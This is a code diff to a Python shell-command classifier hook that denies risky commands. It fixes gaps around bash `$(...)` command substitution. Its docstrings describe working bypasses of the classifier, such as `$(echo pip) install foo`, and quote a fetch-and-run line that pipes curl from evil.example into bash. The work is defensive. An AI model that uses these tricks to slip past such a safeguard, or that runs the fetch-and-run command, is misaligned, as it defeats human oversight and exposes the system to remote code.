@@ -314,6 +314,42 @@ detection is a blanket deny with no flag-NAME sub-case at all, so it
 never had an equivalent narrower resolver to leave behind in the first
 place.
 
+Closed by fourteenth-round Step 8 independent review, ported from the
+task-scoped sibling module's own fourteenth-round fix of the same
+finding: a command substitution (`$(...)`) embedded in another command
+was invisible to every rule in this classifier -- `_is_dynamic` marks
+the whole span dynamic, but `_substitute_var_refs_candidates` never
+matches its shape, so it flowed through as unmodified, never-matching
+literal text instead of being treated as unresolved. This surfaced as
+TWO distinct live bypasses needing TWO distinct fixes, neither
+sufficient alone: a general literal-token-adjacency bypass (`$(echo
+pip) install foo`, confirmed live via a real bash proxy that the
+substitution genuinely resolves to `pip install foo`) where
+`segment_tokens` split a bare command word from whatever followed a
+`(`, putting a tool name and its verb in two different segments -- and
+a BARE, unassigned, unquoted `$(...)` occupying the ENTIRE command
+position (`$(echo "uv install foo")`, a pre-existing regression test)
+whose own OUTPUT is word-split and re-executed as a brand-new command
+by bash. Closed by `_fold_command_substitution_spans` (a new tokenizer
+pass folding each `$(...)` span into one opaque, always-dynamic token
+BEFORE segmenting, keeping the verb in the SAME segment as the now-
+opaque command word) plus `_rule_command_substitution_content`
+(recursively classifies each span's own inner tokens, since folding
+alone makes danger INSIDE a substitution -- or a substitution's own
+inner content that only becomes dangerous once re-executed as the
+whole command line -- invisible to the outer command's own rule
+dispatch). An early version of `_fold_command_substitution_spans` also
+special-cased `_substitute_var_refs_candidates` itself to fail closed
+on ANY `$(` -- this over-broadened the fail-closed behavior into
+whole-segment scanners (B1a/B1b) that resolve EVERY dynamic token in a
+segment: a lone, standalone assignment segment with an unresolvable
+RHS (`x=$(date +%s); echo $x`, confirmed live: harmless) was wrongly
+denied by B1b's own segment-wide resolve. Reverted; closed instead via
+the narrower, position-specific `_is_unresolvable_substitution` guard,
+used only at the exact gh-api flag-name/flag-value resolution call
+sites that check ONE security-relevant token position, never inside
+the shared, whole-segment-scanning primitives themselves.
+
 Deliberately stdlib-only (shlex, re, json) -- no new third-party
 dependency, matching this repository's declarative module-management
 convention and python3's already-accepted-hook-dependency status (see
@@ -440,7 +476,24 @@ def _substitute_var_refs_candidates(
     real `-XPOST` write -- the prior version of this function never
     recognized this syntax at all, so the construct was left as untouched
     literal text, same class of gap as the ninth round's default-clause
-    finding but a different bash feature."""
+    finding but a different bash feature.
+
+    Deliberately does NOT special-case an embedded command substitution
+    (`$(...)`) or backtick substitution here -- an earlier version of
+    this fix (Step 8 independent review, fourteenth round, issue #1326)
+    made this function fail closed (return `None`) on ANY token
+    containing either marker, which propagates through whole-segment
+    scanners like `_rule_b1b_dynamic_word_assigned_tool_and_verb` that
+    resolve EVERY dynamic token in a segment: `x=$(date +%s); echo $x`
+    (confirmed live: harmless) was wrongly denied, since the lone
+    assignment segment `x=$(date +%s)` -- a single dynamic token, no
+    separate tool/verb structure at all -- fail-closed on its own
+    unresolvable RHS. `_rule_recursive_command_substitution` and the
+    narrow, position-specific `_is_unresolvable_substitution` guards at
+    each rule that checks ONE security-relevant token position (not a
+    whole segment) close the real bypasses this would have closed,
+    without that collateral false-positive -- see each one's own
+    docstring."""
     partials = [""]
     pos = 0
     for match in _VAR_REF_FULL_RE.finditer(token):
@@ -506,11 +559,230 @@ def _split_punct_run(token: str) -> list[str]:
     return [token]
 
 
+def _command_substitution_token_span(tokens: list[str], i: int) -> int | None:
+    """If `tokens[i]` ends with `$` and `tokens[i + 1]` is `(` (the shape
+    an UNQUOTED `$(...)` command substitution takes once shlex has split
+    it: `$` and `(` always land as separate tokens, since `(` is a
+    punctuation character shlex breaks the current word at, see
+    `_split_punct_run`'s own docstring), return the index one past the
+    matching `)` -- tracking paren-nesting depth across the intervening
+    tokens so a nested subshell or command substitution does not end the
+    span early. Returns `None` if `tokens[i]` does not open a span here
+    (including the QUOTED case, where shlex's own quote removal already
+    leaves the whole `$(...)` fused as one token before this function
+    ever runs -- see `_find_fused_command_substitution` for that shape).
+
+    Shared by `_fold_command_substitution_spans` (folds the span into one
+    opaque token) and `_rule_command_substitution_content` (recursively
+    classifies the span's own inner tokens) -- factored out by Step 8
+    independent review, fourteenth round (issue #1326), so the two do not
+    grow independently-drifting copies of the identical paren-depth scan."""
+    if not (tokens[i].endswith("$") and i + 1 < len(tokens) and tokens[i + 1] == "("):
+        return None
+    depth = 1
+    j = i + 2
+    n = len(tokens)
+    while j < n and depth > 0:
+        if tokens[j] == "(":
+            depth += 1
+        elif tokens[j] == ")":
+            depth -= 1
+        j += 1
+    return j
+
+
+def _find_fused_command_substitution(token: str) -> tuple[int, int] | None:
+    """If TOKEN itself contains a self-contained `$(...)` span -- the
+    shape shlex leaves fused as ONE token when the substitution appears
+    inside double quotes (`"prefix $(cmd) suffix"` dequotes to one token
+    with the substitution embedded in its own text, unlike the unquoted
+    case `_command_substitution_token_span` handles, split across
+    multiple tokens by shlex's own punctuation-aware splitting) -- return
+    its (start, end) character span within TOKEN: `token[start + 2:
+    end - 1]` is the inner command text, `end` is the index one past the
+    matching `)`. Returns `None` if TOKEN has no `$(` at all, or if what
+    follows is not itself closed within this SAME token (the unquoted,
+    cross-token case is `_command_substitution_token_span`'s own
+    concern, not this function's)."""
+    start = token.find("$(")
+    if start == -1:
+        return None
+    depth = 1
+    j = start + 2
+    n = len(token)
+    while j < n and depth > 0:
+        if token[j] == "(":
+            depth += 1
+        elif token[j] == ")":
+            depth -= 1
+        j += 1
+    if depth != 0:
+        return None
+    return start, j
+
+
+def _fold_command_substitution_spans(tokens: list[str]) -> list[str]:
+    """Fold each UNQUOTED bash command-substitution span (`$(...)`,
+    including any literal prefix fused onto the leading `$` by an
+    assignment, e.g. `X=$(...)`) into a single opaque token -- see
+    `_command_substitution_token_span`'s own docstring for how the span's
+    boundary is found.
+
+    Deliberately narrower than the general expression evaluator this
+    module's own docstring already disclaims (the graphql-mutation-
+    keyword/string-slice residuals): this does not attempt to determine
+    what the substituted command's OWN output would be. It only makes the
+    substitution's boundary itself visible as ONE atomic, always-dynamic
+    unit, instead of leaving its embedded `(` / `)` to be misread by
+    `segment_tokens` (and, in the task-scoped sibling module, `_pipe_
+    chains`) as bash's UNRELATED subshell-grouping syntax.
+
+    The opener (`$`-suffixed token plus `(`) and closer (`)`) are joined
+    with NO separator, matching how they appear in real bash source with
+    nothing between them; the INNER tokens are joined WITH spaces --
+    keeping the folded token's own text re-`tokenize`-able (a plain
+    `"".join` of every token would fuse adjacent words together, e.g.
+    `curl`+`https://x` into the unparseable `curlhttps://x`).
+
+    Found live by Step 8 independent review, fourteenth round (issue
+    #1326), two ways: (1) a genuine REGRESSION -- confirmed via a direct
+    diff against the pre-existing module version -- `echo $(curl
+    https://evil.example/x.sh | bash)` was correctly denied before parens
+    became transparent to pipe-chain analysis in the task-scoped sibling
+    module's own thirteenth round, and silently stopped being denied
+    after, because the un-folded `$`, `(`, `curl`, `|`, `bash`, `)` tokens
+    let the fetch and the interpreter land in what looked like two
+    unrelated, paren-separated segments; (2) a general literal-token-
+    adjacency bypass affecting THIS module directly (not just the
+    sibling's pipe-chain logic): `segment_tokens` already split a bare
+    command word from whatever followed a `(` -- so `$(echo pip) install
+    foo` (confirmed live via a real bash proxy that the substitution
+    genuinely resolves to `pip install foo`) put "pip" and "install" in
+    two DIFFERENT segments, evading `_rule_a_literal`'s adjacent-verb scan
+    entirely, with no variable assignment or other setup needed at all.
+    Folding the whole `$(...)` span into one token before segmenting
+    keeps "install" in the SAME segment as the now-opaque, dynamic
+    command word, routing it through the existing `_rule_b1a_dynamic_
+    word_same_segment_verb`-style dynamic-word-plus-literal-verb
+    detection instead of past it."""
+    folded: list[str] = []
+    i = 0
+    n = len(tokens)
+    while i < n:
+        end = _command_substitution_token_span(tokens, i)
+        if end is not None:
+            prefix = tokens[i] + tokens[i + 1]
+            inner = tokens[i + 2 : end - 1]
+            suffix = tokens[end - 1]
+            middle = (" " + " ".join(inner)) if inner else ""
+            folded.append(prefix + middle + suffix)
+            i = end
+        else:
+            folded.append(tokens[i])
+            i += 1
+    return folded
+
+
+def _is_unresolvable_substitution(token: str) -> bool:
+    """A token embedding a command substitution (`$(...)`, either the
+    unquoted-and-folded shape `_fold_command_substitution_spans` produces
+    or the quoted shape shlex leaves fused as one token on its own) or
+    legacy backtick substitution can resolve to any text at all once bash
+    actually evaluates it -- narrower than `_is_dynamic` (a `$NAME`
+    reference resolves through the SAME candidate-enumeration machinery
+    `_substitute_var_refs_candidates` already handles soundly; this
+    checks specifically for the shape that machinery cannot resolve at
+    all, no matter what is or isn't assigned).
+
+    Used ONLY at rules that check one SPECIFIC, security-relevant token
+    position (a command word, or a flag-name/flag-value position) --
+    never inside the shared, general-purpose `_substitute_var_refs_
+    candidates`/`_resolve_seg_tokens_candidates` primitives themselves,
+    which whole-segment scanners also rely on to resolve EVERY dynamic
+    token in a segment. See `_substitute_var_refs_candidates`'s own
+    docstring for the false-positive history behind this split."""
+    return "$(" in token or "`" in token
+
+
+def _rule_command_substitution_content(tokens: list[str]) -> tuple[str, bool] | None:
+    """Recursively classify each `$(...)` command-substitution span's OWN
+    inner content through this module's full rule set -- bash genuinely
+    RUNS that inner text as a complete command the instant the
+    substitution is evaluated, regardless of where its output ends up
+    being used afterward, so anything that would be denied as a top-level
+    command is just as dangerous embedded in a substitution. Naturally
+    bounded by the actual paren-nesting depth present in the real input
+    -- not an attacker-controlled unbounded search, since the inner
+    tokens/text are already directly present in the token stream, never
+    inferred or enumerated the way `_substitute_var_refs_candidates`'s
+    own bounded candidate expansion is.
+
+    Handles BOTH shapes a `$(...)` span can take: the unquoted, cross-
+    token form (`_command_substitution_token_span`, recursed into via
+    `_classify_tokens` directly on the inner TOKENS, avoiding a lossy
+    token-list-to-string-and-back round trip) and the quoted, single-
+    fused-token form (`_find_fused_command_substitution`, recursed into
+    via `classify` on the inner TEXT, since that is all this shape
+    leaves available).
+
+    Found live by Step 8 independent review, fourteenth round (issue
+    #1326): a BARE, unassigned, unquoted `$(...)` occupying the ENTIRE
+    command position has its own OUTPUT word-split and re-executed as a
+    brand-new command by bash -- `$(echo "uv install foo")` (a
+    pre-existing regression test, `command-sub-wrapped-full-text`)
+    resolves, real bash, to running `uv install foo`. `_fold_command_
+    substitution_spans` alone made the whole span opaque to every rule
+    that used to see `echo`/`uv install foo` as two separate, paren-split
+    segments (the SAME mechanism `_rule_a_literal`'s own same-token
+    literal-phrase fallback already relies on for `echo "pip install
+    foo" | cat`); this recursive check restores that coverage by
+    classifying the span's own inner content directly, instead of
+    requiring the outer, now-opaque token to itself carry the phrase.
+
+    Returns `(reason, is_git_push)` rather than a bare reason string --
+    this module's own `Verdict` carries a THIRD, warn-only `is_git_push`
+    field the task-scoped sibling module's `Verdict` does not; a denied
+    inner command substitution embedding a git-push (`$(git push origin
+    main)`) must still propagate that signal outward, not silently drop
+    it just because the deny itself came from this recursive check rather
+    than the top-level dispatch."""
+    i = 0
+    n = len(tokens)
+    while i < n:
+        fused = _find_fused_command_substitution(tokens[i])
+        if fused is not None:
+            start, end = fused
+            inner_text = tokens[i][start + 2 : end - 1]
+            if inner_text.strip():
+                inner_verdict = classify(inner_text)
+                if inner_verdict.deny:
+                    reason = f"a command substitution $(...) embeds a denied command -- {inner_verdict.reason}"
+                    return reason, inner_verdict.is_git_push
+            i += 1
+            continue
+        span_end = _command_substitution_token_span(tokens, i)
+        if span_end is not None:
+            inner_tokens = tokens[i + 2 : span_end - 1]
+            if inner_tokens:
+                inner_verdict = _classify_tokens(inner_tokens)
+                if inner_verdict.deny:
+                    reason = f"a command substitution $(...) embeds a denied command -- {inner_verdict.reason}"
+                    return reason, inner_verdict.is_git_push
+            i = span_end
+            continue
+        i += 1
+    return None
+
+
 def tokenize(command: str) -> list[str]:
     """Raises TokenizeError on anything shlex cannot parse (e.g. an
     unbalanced quote) -- the caller must fail closed on that, the same
     fail-closed discipline this hook's malformed-JSON guards already
-    apply one layer up."""
+    apply one layer up. Deliberately does NOT fold command-substitution
+    spans here -- `_classify_tokens` applies `_fold_command_substitution_
+    spans` itself, AFTER first running `_rule_command_substitution_
+    content` against these still-unfolded tokens, which needs each
+    span's own inner tokens still separable."""
     try:
         lexer = shlex.shlex(command, posix=True, punctuation_chars=True)
         lexer.whitespace_split = True
@@ -826,6 +1098,8 @@ def _gh_api_method_dynamic_hit(
         dynamic_value_part = _gh_api_method_dynamic_value(seg, i, raw_tok)
         if dynamic_value_part is None:
             continue
+        if _is_unresolvable_substitution(dynamic_value_part):
+            return True
         candidates = _substitute_var_refs_candidates(dynamic_value_part, name_to_value, name_to_raw_value)
         if _write_method_candidate_hit(candidates):
             return True
@@ -885,6 +1159,8 @@ def _gh_api_method_flagname_dynamic_hit(
     for i, raw_tok in enumerate(seg):
         if not _is_dynamic(raw_tok):
             continue
+        if _is_unresolvable_substitution(raw_tok):
+            return True
         flag_candidates = _substitute_var_refs_candidates(raw_tok, name_to_value, name_to_raw_value)
         if flag_candidates is None:
             return True
@@ -894,6 +1170,8 @@ def _gh_api_method_flagname_dynamic_hit(
             continue
         value_tok = seg[i + 1]
         if _is_dynamic(value_tok):
+            if _is_unresolvable_substitution(value_tok):
+                return True
             candidates = _substitute_var_refs_candidates(value_tok, name_to_value, name_to_raw_value)
             if _write_method_candidate_hit(candidates):
                 return True
@@ -930,6 +1208,8 @@ def _gh_api_method_fused_flagname_dynamic_hit(
     for raw_tok in seg:
         if not _is_dynamic(raw_tok):
             continue
+        if _is_unresolvable_substitution(raw_tok):
+            return True
         candidates = _substitute_var_refs_candidates(raw_tok, name_to_value, name_to_raw_value)
         if candidates is None:
             return True
@@ -1009,6 +1289,8 @@ def _gh_api_field_flagname_dynamic_hit(
     for raw_tok in seg:
         if not _is_dynamic(raw_tok):
             continue
+        if _is_unresolvable_substitution(raw_tok):
+            return True
         candidates = _substitute_var_refs_candidates(raw_tok, name_to_value, name_to_raw_value)
         if candidates is None:
             return True
@@ -1034,6 +1316,8 @@ def _gh_api_field_fused_flagname_dynamic_hit(
     for raw_tok in seg:
         if not _is_dynamic(raw_tok):
             continue
+        if _is_unresolvable_substitution(raw_tok):
+            return True
         candidates = _substitute_var_refs_candidates(raw_tok, name_to_value, name_to_raw_value)
         if candidates is None:
             return True
@@ -1290,11 +1574,31 @@ def classify(command: str) -> Verdict:
         tokens = tokenize(command)
     except TokenizeError as error:
         return Verdict(True, f"the command could not be parsed as shell syntax ({error}). Failing closed", False)
+    return _classify_tokens(tokens)
 
+
+def _classify_tokens(tokens: list[str]) -> Verdict:
+    """The token-level core of `classify` -- split out so `_rule_command_
+    substitution_content` can recurse into a `$(...)` span's own inner
+    tokens directly, without a lossy token-list-to-string-and-back round
+    trip through `tokenize` again. `classify` (the module's public,
+    string-based entry point) is a thin wrapper around this. Reconstructs
+    `lowered_command` from TOKENS (`" ".join(tokens).lower()`) rather than
+    receiving the original source string -- a recursive call has no
+    original string, only the inner span's own tokens; the graphql-
+    mutation-keyword check this feeds is already a disclosed, best-effort
+    substring residual (see `_rule_gh_api_write`'s own docstring), not a
+    sound one this reconstruction could meaningfully weaken further."""
+    content_hit = _rule_command_substitution_content(tokens)
+    if content_hit:
+        reason, inner_is_git_push = content_hit
+        return Verdict(True, reason, inner_is_git_push)
+
+    tokens = _fold_command_substitution_spans(tokens)
     segments = segment_tokens(tokens)
     assigned = _assigned_literals(tokens)
     raw_assigned = _assigned_raw_values(tokens)
-    lowered_command = command.lower()
+    lowered_command = " ".join(tokens).lower()
 
     is_git_push = any(_is_git_push_segment(seg) for seg in segments)
 
